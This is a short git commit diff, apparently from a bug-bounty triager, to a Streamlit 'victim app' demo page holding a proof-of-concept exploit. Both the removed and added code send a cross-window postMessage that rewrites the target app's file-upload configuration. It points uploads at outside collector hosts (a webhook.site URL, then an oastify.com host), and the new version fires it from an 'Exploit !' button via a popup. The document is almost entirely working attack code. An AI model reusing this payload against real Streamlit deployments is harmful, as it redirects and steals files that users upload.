9834b8603bd1a48b99c74a60afb04deb567650aa
Triager BKI <b.kirchner@yeswehack.com>
2025-10-20 15:15:34 +0200

    fix

--- streamlite_app.py
+++ streamlite_app.py
@@ -2,17 +2,31 @@ import streamlit as st
 import streamlit.components.v1 as components
 
 st.title("Demo host of victim app")
-components.html(f"""
- <iframe id="victim" src="https://activate-fwwrn5gbiq-ey.a.run.app/" style="width:100%;height:800px;border:1px solid #ccc"></iframe>
- <script>
-   const iframe = document.getElementById('victim');
-   iframe.addEventListener('load', () => {{
-     iframe.contentWindow.postMessage({{
-       stCommVersion: 1,
-       type: "SET_FILE_UPLOAD_CLIENT_CONFIG",
-       prefix: "https://webhook.site/204c903f-0e81-48bf-87b6-52bf71edd97f",
-       headers: {{"X-Debug": "demo"}}
-     }}, "https://activate-fwwrn5gbiq-ey.a.run.app");
-   }});
- </script>
+components.html("""
+  <button onclick="exploit()">Exploit !</button>
+  <!-- <iframe id="frame" src="https://activate-fwwrn5gbiq-ey.a.run.app/" onload="test()" width="100%" height="100%"></iframe> -->
+
+  <script>
+  function test() {
+    console.log('iframe loaded');
+  }
+
+  function exploit() {
+    const w = window.open('https://activate-fwwrn5gbiq-ey.a.run.app', 'poc-streamlit');
+    if (!w) {
+      alert('Popup blocked. Please allow popups for this site and try again.');
+      return;
+    }
+    // const iframe = document.getElementsByTagName('iframe')[0];
+    setTimeout(() => {
+      confirm('Sending message ?')
+      w.postMessage({
+        stCommVersion: 1,
+        type: "SET_FILE_UPLOAD_CLIENT_CONFIG", 
+        prefix: "https://jdwhu82csdic1derbpee9ax8oe429ay.oastify.com",
+        headers: {"abc": "def"}
+      }, 'https://activate-fwwrn5gbiq-ey.a.run.app');
+    }, 2000);
+  }
+  </script>
 """, height=840)
